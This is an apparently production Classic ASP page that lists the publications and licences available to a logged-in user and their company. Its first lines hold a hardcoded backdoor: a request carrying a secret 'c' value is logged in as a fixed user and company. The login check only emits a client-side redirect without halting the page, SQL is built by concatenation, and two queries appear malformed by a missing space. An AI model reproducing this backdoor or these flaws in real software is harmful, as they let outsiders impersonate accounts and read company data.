<%
    if request("c") = "$4994jACK7I0$" then 
      session("stp_userid") = 7426
      session("stp_companyid") =355  
    end if

userid = session("stp_userid")
companyid = session("stp_companyid")   

if len(userid) <= 0 then
    response.write("<script>")
    response.write("location.replace('/','back')")
    response.write("</script>") 
    'Response.Redirect("/client.asp")
end if

 SQL = 	"select sr.securityrole from usersecurity us " &_
		"left outer join securityrole sr on sr.securityroleid = us.securityrole " &_
		"where us.userid = " & userid
set getRole = conn.Execute(SQL)

if getRole("securityrole") <> "User" Then 
  
  SQL = "select DISTINCT a.Title, a.publicationID, a.StateDifferenceID, c.Company, c.UserID, a.acronym, a.versionNo, a.last_updated, e.CategoryName, e.CategoryID, d.PPPath  " &_
        "from AvailablePublications b  " &_
        "left join Publications a on a.publicationID = b.publicationID " &_
        "left join Users c on b.UserID = c.UserId " &_
        "left outer join PubCategory e on e.CategoryID = a.CategoryID " &_
        "left outer join ProfileSheets d on d.publicationID = a.publicationID " &_
        "where b.UserId = " & userid & " " &_
        "and a.Disabled = 0 " &_
        "and a.hasApp = 1 " &_
        "order by  a.acronym, a.Title"
   Set getUserPubs = conn.Execute(sql)

    if not(getUserPubs.eof and getUserPubs.bof) then
     	SQL = "select DISTINCT a.Title, a.publicationID, a.StateDifferenceID, c.Company, c.UserID as U_ID, a.acronym, a.versionNo, a.last_updated, e.CategoryName, e.CategoryID, d.PPPath  " &_
            "from AvailablePublications b  " &_
            "left join Publications a on a.publicationID = b.publicationID " &_
            "left join Users c on b.UserID = c.UserId " &_
            "left outer join PubCategory e on e.CategoryID = a.CategoryID " &_
            "left outer join ProfileSheets d on d.publicationID = a.publicationID " &_
            "where b.UserId = " & userid & " " &_
            "and a.Disabled = 0 " &_
            "and a.hasApp = 1 " &_
            "UNION " &_
     		"select DISTINCT a.Title, a.publicationID, a.StateDifferenceID, c.companyname as company, c.companyid as U_ID, a.acronym, a.versionNo, a.last_updated, e.CategoryName, e.CategoryID, d.PPPath " &_
            "from AvailableLicenses b " &_
            "left join Publications a on a.publicationID = b.publicationID " &_
            "left join company c on c.companyid = b.companyID " &_
            "left outer join PubCategory e on e.CategoryID = a.CategoryID " &_
            "left outer join ProfileSheets d on d.publicationID = a.publicationID " &_
            "where b.CompanyId = " & companyid &_
            "and a.Disabled = 0 " &_
            "and a.hasApp = 1 " &_
            "order by  a.acronym, a.Title"
       Set getPubs = conn.Execute(sql)
    
    else
      SQL = "select DISTINCT a.Title, a.publicationID, a.StateDifferenceID, a.acronym, a.versionNo, a.last_updated, e.CategoryName, e.CategoryID, d.PPPath " &_
            "from AvailableLicenses b " &_
            "left join Publications a on a.publicationID = b.publicationID " &_
            "left outer join PubCategory e on e.CategoryID = a.CategoryID " &_
            "left outer join ProfileSheets d on d.publicationID = a.publicationID " &_
            "where b.CompanyId = " & companyid &_
            "and a.Disabled = 0 " &_
            "and a.hasApp = 1 " &_
            "order by  a.acronym, a.Title"
       Set getPubs = conn.Execute(sql)
    end if
Else 
  SQL = "select DISTINCT a.Title, a.publicationID, a.StateDifferenceID, c.Company, c.UserID, a.acronym, a.versionNo, a.last_updated, e.CategoryName, e.CategoryID, d.PPPath  " &_
        "from AvailablePublications b  " &_
        "left join Publications a on a.publicationID = b.publicationID " &_
        "left join Users c on b.UserID = c.UserId " &_
        "left outer join PubCategory e on e.CategoryID = a.CategoryID " &_
        "left outer join ProfileSheets d on d.publicationID = a.publicationID " &_
        "where b.UserId = " & userid & " " &_
        "and a.Disabled = 0 " &_
        "and a.hasApp = 1 " &_
        "order by a.acronym, a.Title"
  Set getPubs = conn.Execute(sql)
  end if
%>